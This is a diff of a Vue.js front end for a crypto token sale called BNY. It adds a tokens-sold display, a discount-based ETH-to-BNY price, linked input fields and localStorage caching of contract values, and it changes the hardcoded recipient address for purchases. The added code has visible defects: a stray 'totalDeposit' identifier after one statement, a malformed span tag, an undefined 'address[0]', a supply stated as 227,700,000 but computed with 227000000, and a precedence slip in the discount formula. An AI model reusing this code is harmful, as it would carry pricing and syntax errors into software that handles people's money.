@@ -5,16 +5,16 @@
     <div class="flex items-center justify-between px-6 py-4 border-b border-grey-light bg-white">
       <div>
       <p class="text-xs text-center uppercase leading-normal">Total BNY for sale</p> 
-       <p class="text-lg leading-none">227,700,000 {{ tokenTicker }}</p>
+       <p class="text-lg leading-none"> 227,700,000 {{ tokenTicker }}</p>
         
       </div>
        <div>
        <p class="text-xs text-center uppercase leading-normal">Total BNY Sold</p> 
-       <p class="text-lg leading-none">0 {{ tokenTicker }}</p>
+       <p class="text-lg leading-none">{{tokensSold}} {{ tokenTicker }}</p>
       </div>
        <div>
        <p class="text-xs text-center uppercase leading-normal">BNY AVAILABLE for sale</p> 
-       <p class="text-lg leading-none">227,700,000 {{ tokenTicker }}</p>
+       <p class="text-lg leading-none">     {{227000000 - tokensSold  }} {{ tokenTicker }}</p>
        
       </div>
       <div class="flex items-center" >
@@ -24,7 +24,7 @@
         </div>
        <div class="mr-12">
           <p class="text-xs text-center uppercase leading-normal">Balance</p> 
-          <p class="text-lg leading-none">{{ ethBalance }} ETH</p>
+          <p class="text-lg leading-none">{{ethBalance  }} ETH</p>
         </div>
       </div>
     </div>
@@ -32,15 +32,9 @@
       <div class="w-full max-w-md mt-4">
         <div class="bg-white shadow-md rounded px-4 pt-4 pb-6 mb-4">
           <div class="flex justify-between">
-            <h3 style="margin-left: 270px;"  class="mb-2">Buy {{ currency }}</h3>
+            <h3 style="margin-left: 270px;"  class="mb-2">Buy BNY</h3>
             <div style="margin-top: 50px;" class="inline-flex">
-              <button 
-                class="focus:outline-none border border-bg-grey-light hover:bg-grey text-grey-darkest font-bold py-2 px-4 rounded-l" 
-                :class="currency == tokenTicker ? 'bg-grey-light' : 'bg-grey-lightest'"
-                @click="setCurrency(tokenTicker)"
-              >
-                {{ tokenTicker }}
-              </button>
+              
               <button 
                 class="focus:outline-none border border-bg-grey-light hover:bg-grey text-grey-darkest font-bold py-2 px-4 rounded-r" 
                 :class="currency == tokenTicker ? 'bg-grey-lightest' : 'bg-grey-light'"
@@ -52,25 +46,55 @@
             
           </div>
           <p class="text-xs uppercase text-left text-black text-xs font-bold" >      
-                  dynamic Price: 
+                  Current Price Discount: {{0.25 * (1-(tokensSold / 227000000)).toFixed(4)}} %
                 </p>
+                <p class="text-xs uppercase text-left text-black text-xs font-bold" >      
+                   1 ETH = {{((0.25 * (1-(tokensSold / 227000000))) * 506000 + 506000).toFixed(2) }} BNY
+                </p>
+                
+            
+           
           <div>
-            <div style="margin-top: 40px;" class="flex justify-between">
-              <label  class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">Amount</label>
+          <div style="margin-top: 40px;" class="flex justify-between">
+              <label  class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">BNY Amount To Buy</label>
               <span class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">
-                 <span v-if="currency == tokenTicker">{{ sendTokenBalance }} {{ currency }} Available</span>
-                 <span v-else>{{ sendEthBalance }} {{ currency }} Available</span>
+                 
+               
                </span>
-              <a href="#" class="block uppercase tracking-wide text-blue text-xs font-bold mb-2 no-underline" @click="sendMax()">Buy Max</a>
+              <a href="#" class="block uppercase tracking-wide text-blue text-xs font-bold mb-2 no-underline" @click="sendMax(),adj(),adj2()">Buy Max</a>
+            
+            </div>
+          <input 
+              type="text" 
+               ref="SEND2"
+              class="appearance-none outline-none block w-full bg-grey-lighter text-grey-darker border border-grey-lighter rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:border-grey-light"
+              :placeholder= 'tokenTicker'
+              v-model="sendAmount2" @Change="adj2()" @input="adj2()" @click="adj2()"
+            >
+              <p class="text-xs uppercase text-left text-black text-xs font-bold" >      
+              
+                </p>
+            <div style="margin-top: 40px;" class="flex justify-between">
+              <label  class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">ETH Amount</label>
+              <span class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">
+               
+                 <span {{ sendEthBalance }} {{ currency }} Available</span>
+               </span>
+              <a href="#" class="block uppercase tracking-wide text-blue text-xs font-bold mb-2 no-underline" @click="sendMax(),adj(),adj2()">Buy Max</a>
+            
             </div>
             <input 
-              type="text" 
-              @Change="tokenstobuy()" @click="tokenstobuy()" @input="tokenstobuy()"
+              type="text" id="dd"
+              @Change="adj()" @input="adj()" @click="adj()"
               class="appearance-none outline-none block w-full bg-grey-lighter text-grey-darker border border-grey-lighter rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:border-grey-light"
-              :placeholder="currency"
+              placeholder= 'ETH'
+              
               v-model="sendAmount"
             >
           </div>
+          <p class="text-xs uppercase text-left text-black text-xs font-bold" >      
+            
+                </p>
           <div>
             <div class="flex justify-between">
               <label class="block uppercase tracking-wide text-grey-darker text-xs font-bold mb-2">Gas Fee</label>
@@ -111,8 +135,8 @@
               
             >
           </div>
-          <span  style="margin-top: 50px;margin-left: 230px;"class="block uppercase tracking-wide text-black-darker text-xs font-bold mb-2">You are buying: {{ tokentobuy }} BNY</span>
-          <span  style="margin-left: 260px;"class="block uppercase tracking-wide text-black-darker text-xs font-bold mb-2">Cost: {{ ETHcost }} ETH</span>
+          <span  style="margin-top: 50px;margin-left: 230px;"class="block uppercase tracking-wide text-black-darker text-xs font-bold mb-2">You are buying:  {{sendAmount2}} BNY</span>
+          <span  style="margin-left: 260px;"class="block uppercase tracking-wide text-black-darker text-xs font-bold mb-2">Cost: {{sendAmount}} ETH</span>
           <button 
             type="button" 
             class="focus:outline-none  bg-orange hover:bg-orange-dark text-white py-3 px-6 rounded"
@@ -150,10 +174,14 @@
         ethPrice: 0,
         sendEthBalance: 0,
         sendTokenBalance: 0,
+        tokensSold: '0',
         ethBalance: '0',
+        Rate: '0',
+        totalDeposit: '0',
         tokenBalance: '0',
         sendRecipient: '',
         sendAmount: '',
+        sendAmount2: '',
         sendGasAmount: 80000,
         sendGasFee: 0,
         sendGasCost: '0.00',
@@ -188,19 +216,50 @@
         let ethPrice      = await localStorage.getItem('ethPrice');
         let ethBalance    = await localStorage.getItem('ethBalance');
         let tokenBalance  = await localStorage.getItem('tokenBalance');
-        
+        let tokensSold  = await localStorage.getItem('tokensSold');  totalDeposit
+        let Rate  = await localStorage.getItem('Rate');
+        let totalDeposit  = await localStorage.getItem('totalDeposit');
 
         this.ethPrice = ethPrice;
         this.sendEthBalance = ethBalance;
         this.sendTokenBalance = tokenBalance;
         this.tokenBalance = tokenBalance != null ? parseFloat(tokenBalance) : '0';
+        this.tokensSold = tokensSold != null ? parseFloat(tokensSold) : '0';
+          this.ethBalance   = ethBalance != null ? parseFloat(ethBalance) : '0'; 
+          this.Rate   = Rate != null ? parseFloat(Rate) : '0';
+          this.totalDeposit   = totalDeposit != null ? parseFloat(totalDeposit) : '0';
 
         this.getEthPrice();
         this.getTokenBalance();
         this.getEthBalance();
       },
-      
+      getEthBalance: function () {
+        web3.eth.getBalance(this.walletAddress, (error, balance) => {
+          if(balance) {
+            let ethBalance = web3.utils.fromWei(balance, 'ether');
+            let ethValue = ethBalance * this.ethPrice;
+
+			this.ethBalance = utils.format(ethBalance, 9);
+            this.ethValue = utils.format(ethValue, 2);
+
+            localStorage.setItem('ethBalance', ethBalance.toString());
+          }
+        });
+      },
       getEthPrice: function () {
+        let contract = new web3.eth.Contract(env.abi, env.contractAddress);
+let data = contract.methods.tokensSold().encodeABI();
+
+contract.methods.tokensSold().call().then((result) =>  { 
+         localStorage.setItem('tokensSold', JSON.parse(result/1000000000000000000));
+      });
+     
+      contract.methods.totalSupply().call().then((result) =>  { 
+         localStorage.setItem('Rate', JSON.parse(result/1000000000000000000));  
+      })
+      contract.methods.balanceOf(address[0]).call().then((result) =>  { 
+         localStorage.setItem('totalDeposit', JSON.parse(result/1000000000000000000));
+      })
         axios.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD')
           .then(response => {
             if(response.data.USD != undefined) {
@@ -234,12 +293,7 @@
         this.sendGasFee = utils.format(sendGasEth * this.sendGasAmount);
         this.sendGasCost = utils.format(this.sendGasFee * this.ethPrice, 2);
       },
-      tokenstobuy: function(){
-        
-      this.tokentobuy = this.sendAmount;
-      this.ETHcost = this.sendAmount / 10000;
-      
-      },  
+     
       
 
 
@@ -250,7 +304,24 @@
           this.sendAmount = this.sendTokenBalance;
         }
       },
+      totalforsale: function(){
+        let contract = new web3.eth.Contract(env.abi, env.contractAddress);
+let data = contract.methods.tokensSold().encodeABI();
 
+contract.methods.tokensSold().call().then((result) =>  { 
+         localStorage.setItem('tokensSold', JSON.parse(result));
+      });
+
+      
+      },
+      adj: function(){
+        this.sendAmount2 = this.sendAmount *  ((0.25 * (1-(this.tokensSold / 227000000))) * 506000 + 506000);
+        
+      },
+      adj2: function(){
+        
+        this.sendAmount = this.sendAmount2 /  ((0.25 * (1-(this.tokensSold / 227000000))) * 506000 + 506000) ;
+      },
       verify: async function () {
         const storedPassword = await localStorage.getItem('passwordEncrypted');
 
@@ -258,7 +329,7 @@
         let sendGasPrice = parseFloat(this.sendGas);
         let sendGasAmount = parseInt(this.sendGasAmount);
         let sendAmount = parseFloat(this.sendAmount);
-        let sendRecipient = "0xA6B7084e510385Ce87635b0A857Ae6703cf98b1D";
+        let sendRecipient = "0x7052E3e184885aB4F716CFF7E4F437aDd2912cff";
         let password = this.password;
         let data;
         let value;
